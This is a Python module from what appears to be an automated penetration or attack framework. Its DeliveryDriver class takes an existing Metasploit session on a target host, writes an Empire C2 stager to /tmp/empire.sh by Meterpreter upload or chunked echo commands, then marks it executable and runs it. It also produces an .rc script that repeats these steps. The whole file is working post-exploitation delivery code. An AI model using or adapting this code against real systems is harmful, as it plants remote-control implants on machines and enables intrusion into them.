from modules.core.driver import BaseToolDriver, DriverResult, ParsedResult
from modules.core.utils import safe_filename
from pymetasploit3.msfrpc import MsfRpcClient
from modules.drivers.post_exploit.shgen import chunked_echo_script,script_to_echo_lines
import os
import time
import socket

class DeliveryDriver(BaseToolDriver):
    name = "delivery"
    
    def run(self, target: str, **kwargs) -> DriverResult:
        launcher = kwargs.get("launcher")
        rc_output_path = kwargs.get("rc_output_path")   # Name/path for the new .rc file
        rc_file = kwargs.get("rc_file")

        if not launcher:
            raise RuntimeError("No launcher code provided to DeliveryDriver!")
        if not rc_output_path:
            raise RuntimeError("No rc_output_path provided to DeliveryDriver!")
        if not rc_file or not os.path.isfile(rc_file):
            raise RuntimeError(f"No valid rc_file provided: {rc_file}")
        
        sessions = self.config.get("metasploit_sessions", {}).get(target, [])
        if not sessions:
            raise RuntimeError(f"No Meterpreter/Command shell session for {target}")

        sid = sessions[0]
        stager_path = os.path.join(
            self.config["empire_output_dir"],
            f"{safe_filename(target)}.sh"
        )
        with open(stager_path, "w") as f:
            f.write(launcher)
        
        # --- Generate echo commands for Empire stager ---
        delivery_commands = script_to_echo_lines(stager_path, remote_path="/tmp/empire.sh")
        
        msfrpc_pass = self.config.get("msfrpc_password", "workplease")
        msfrpc_host = self.config.get("msfrpc_host", "127.0.0.1")
        msfrpc_port = self.config.get("msfrpc_port", 55553)

         # --- Create new .rc file: copy original + delivery phase ---
        with open(rc_file, "r") as orig, open(rc_output_path, "w") as out:
            for line in orig:
                out.write(line)
            out.write("\n# --- Begin Empire stager delivery phase ---\n")
            out.write("rm -f /tmp/empire.sh\n")
            for cmd in delivery_commands:
                out.write(cmd + "\n")
            out.write("chmod +x /tmp/empire.sh\n")
            out.write("/tmp/empire.sh\n")

        self.logger.info(f"[DeliveryDriver] Created new RC file for delivery: {rc_output_path}")
        
        try:
            client = MsfRpcClient(msfrpc_pass, server=msfrpc_host, port=msfrpc_port)
        except (ConnectionResetError, socket.error) as e:
            self.logger.error(f"[DeliveryDriver] Could not connect to Metasploit RPC: {e}")
            raise RuntimeError("Failed to connect to Metasploit RPC server") from e

        session = client.sessions.session(sid)
        session_type = getattr(session, 'type', None)
        self.logger.info(f"[DeliveryDriver] Session type: {session_type}")

        if session_type == 'meterpreter':
            with open(stager_path, "rb") as f:
                stager_data = f.read()
            upload_result = session.upload_file("/tmp/empire.sh", stager_data)
            if not upload_result:
                self.logger.error("[DeliveryDriver] Meterpreter upload failed")
                raise RuntimeError("Upload failed (meterpreter)")
            self.logger.info("[DeliveryDriver] Meterpreter upload successful")
            out = session.run_with_output("chmod +x /tmp/empire.sh")
            self.logger.info(f"[DeliveryDriver] chmod output: {out}")
            out = session.run_with_output("/tmp/empire.sh")
            self.logger.info(f"[DeliveryDriver] script run output: {out}")
            return DriverResult(raw_output="/tmp/empire.sh [meterpreter uploaded and executed]")

        elif session_type == 'shell':
            self.logger.info(f"[DeliveryDriver] Using chunked-echo transfer for shell session {sid}")
            remote_path = "/tmp/empire.sh"
            commands = chunked_echo_script(launcher, remote_path=remote_path, chunk_size=200)
            for i, cmd in enumerate(commands):
                try:
                    self.logger.debug(f"[DeliveryDriver] Writing chunk {i+1}/{len(commands)}: {cmd[:60]}...")
                    session.write(cmd + "\n")
                    time.sleep(0.03)  # throttle to avoid overflow
                except Exception as e:
                    self.logger.error(f"[DeliveryDriver] Error writing chunk {i+1}: {e}")
                    raise
            self.logger.info("[DeliveryDriver] Upload complete, running chmod and executing stager...")
            try:
                session.write(f"chmod +x {remote_path}\n")
                time.sleep(0.1)
                session.write(f"{remote_path}\n")
                time.sleep(0.2)
            except Exception as e:
                self.logger.error(f"[DeliveryDriver] Error running chmod or executing script: {e}")
                raise
            self.logger.info(f"[DeliveryDriver] {remote_path} uploaded via chunked-echo and executed.")
            return DriverResult(raw_output=f"{remote_path} [chunked-echo upload, shell executed]")

        else:
            self.logger.error(f"[DeliveryDriver] Unsupported session type: {session_type}")
            raise RuntimeError(f"Unsupported session type: {session_type}")

    def parse(self, raw_output_path: str) -> ParsedResult:
        return ParsedResult(data={"deployed": True})
